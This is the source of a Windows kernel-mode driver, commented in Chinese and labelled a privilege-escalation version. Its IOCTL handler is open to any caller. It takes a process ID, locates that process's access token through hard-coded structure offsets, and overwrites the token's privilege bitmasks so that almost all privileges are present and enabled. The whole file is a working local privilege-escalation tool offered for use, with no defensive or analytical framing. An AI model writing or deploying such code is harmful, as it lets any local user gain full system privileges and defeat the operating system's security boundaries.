// MyDriver.c - Kernel-Mode Driver (Privilege Escalation Version)
#include <ntifs.h>

// =======================================================================
//   1. 將所有自訂的結構定義和 IOCTL 放在檔案頂部
// =======================================================================

// 自訂 _SEP_TOKEN_PRIVILEGES 結構定義
// 因為這個結構不是公開的，我們需要自己定義它
typedef struct _SEP_TOKEN_PRIVILEGES {
    ULONGLONG Present;
    ULONGLONG Enabled;
    ULONGLONG EnabledByDefault;
} SEP_TOKEN_PRIVILEGES, * PSEP_TOKEN_PRIVILEGES;

// IOCTL 定義
#define IOCTL_EXECUTE_MEMORY_OP CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

// 傳遞資料的結構定義
typedef struct _KERNEL_OP_REQUEST {
    ULONG ProcessId;
} KERNEL_OP_REQUEST, * PKERNEL_OP_REQUEST;


// =======================================================================
//   2. 驅動程式的函式實作
// =======================================================================

// --- DriverUnload (如果有的話，可以放在這裡) ---
VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject) {
    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\MyDriver");
    IoDeleteSymbolicLink(&symLink);
    IoDeleteDevice(DriverObject->DeviceObject);
    KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[MyDriver] Driver Unloaded\n"));
}

// DeviceControl 函式
NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);

    NTSTATUS status = STATUS_SUCCESS;
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    ULONG bytesIO = 0;

    if (stack->Parameters.DeviceIoControl.IoControlCode == IOCTL_EXECUTE_MEMORY_OP) {
        PKERNEL_OP_REQUEST req = (PKERNEL_OP_REQUEST)Irp->AssociatedIrp.SystemBuffer;

        PEPROCESS targetProcess = NULL;
        status = PsLookupProcessByProcessId((HANDLE)req->ProcessId, &targetProcess);

        if (!NT_SUCCESS(status)) {
            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[MyDriver] PsLookupProcessByProcessId 失敗: 0x%X\n", status));
        }
        else {
            KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[MyDriver] 成功找到 PID %lu 的 EPROCESS: 0x%p\n", req->ProcessId, targetProcess));

            // Token Offset for modern Windows 10/11
#define TOKEN_OFFSET 0x248 
            PACCESS_TOKEN pToken = (PACCESS_TOKEN)(*(PULONG_PTR)((PUCHAR)targetProcess + TOKEN_OFFSET));
            pToken = (PACCESS_TOKEN)((ULONG_PTR)pToken & ~0xF);

            if (!pToken) {
                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[MyDriver] 找不到 Token 物件！\n"));
                status = STATUS_NOT_FOUND;
            }
            else {
                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[MyDriver] 找到 Token 物件: 0x%p\n", pToken));

#define PRIVILEGES_OFFSET 0x40
                // 現在編譯器已經認識 PSEP_TOKEN_PRIVILEGES 了
                PSEP_TOKEN_PRIVILEGES pPrivileges = (PSEP_TOKEN_PRIVILEGES)((PUCHAR)pToken + PRIVILEGES_OFFSET);

                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[MyDriver] _SEP_TOKEN_PRIVILEGES 位於: 0x%p\n", pPrivileges));
                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[MyDriver] 原始 Present: 0x%llX, Enabled: 0x%llX\n", pPrivileges->Present, pPrivileges->Enabled));

                pPrivileges->Present = 0x0000001ff2ffffbc;
                pPrivileges->Enabled = 0x0000001ff2ffffbc;

                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[MyDriver] [SUCCESS] 權限已修改！\n"));
                KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[MyDriver] 新 Present: 0x%llX, Enabled: 0x%llX\n", pPrivileges->Present, pPrivileges->Enabled));
            }

            ObDereferenceObject(targetProcess);
        }
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = bytesIO;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

// DriverEntry 函式
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);

    NTSTATUS status;
    PDEVICE_OBJECT deviceObject = NULL;
    UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\MyDriver");
    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\MyDriver");

    status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &deviceObject);
    if (!NT_SUCCESS(status)) {
        KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[MyDriver] IoCreateDevice 失敗: 0x%X\n", status));
        return status;
    }

    status = IoCreateSymbolicLink(&symLink, &devName);
    if (!NT_SUCCESS(status)) {
        KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[MyDriver] IoCreateSymbolicLink 失敗: 0x%X\n", status));
        IoDeleteDevice(deviceObject);
        return status;
    }

    DriverObject->MajorFunction[IRP_MJ_CREATE] =
        DriverObject->MajorFunction[IRP_MJ_CLOSE] =
        DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;
    DriverObject->DriverUnload = DriverUnload;

    deviceObject->Flags |= DO_BUFFERED_IO;
    deviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

    KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[MyDriver] Driver Loaded and Initialized\n"));
    return STATUS_SUCCESS;
}